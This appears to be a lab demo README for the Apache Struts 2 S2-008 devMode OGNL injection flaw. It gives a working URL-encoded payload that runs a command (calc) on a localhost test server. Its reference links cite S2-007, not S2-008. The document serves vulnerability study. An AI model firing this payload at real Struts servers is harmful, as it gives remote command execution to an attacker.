# S2-008 Demo

## Summary

Impact of vulnerability: Remote command execution

Affected Software: `Struts 2.0.0` - `Struts 2.3.17`

Problem: When `devMode` is on, the hacker can pass in `ognl` expressions for execution.

## Environment

Struts2 version: `struts-2.2.3`

Server: `Tomcat 8.5.53`

IDE: `idea 2020.1.1 ULTIMATE`

## POC



![devmode](devmode.jpg)

## Payload

- open `calc.exe`

  ```java
  http://localhost:8080/s2_008_war_exploded/devmode.action
  ?debug=command
  &expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22calc%22%29)
  ```


## Reference

- [S2-007 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-007/README.zh-cn.md)


* [【Struts2-命令-代码执行漏洞分析系列】S2-007](https://xz.aliyun.com/t/2684)

* [S2-007](https://cwiki.apache.org/confluence/display/WW/S2-007)